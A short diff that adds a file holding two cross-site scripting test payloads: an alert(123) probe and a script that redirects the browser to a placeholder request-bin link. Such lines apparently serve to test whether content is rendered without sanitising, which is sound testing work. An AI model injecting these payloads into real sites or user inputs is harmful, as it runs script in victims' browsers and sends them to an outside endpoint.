@@ -1,0 +1,4 @@
+<script>alert(123);</script>
+
+
+<script>window.location.href="(request bin link)";</script>
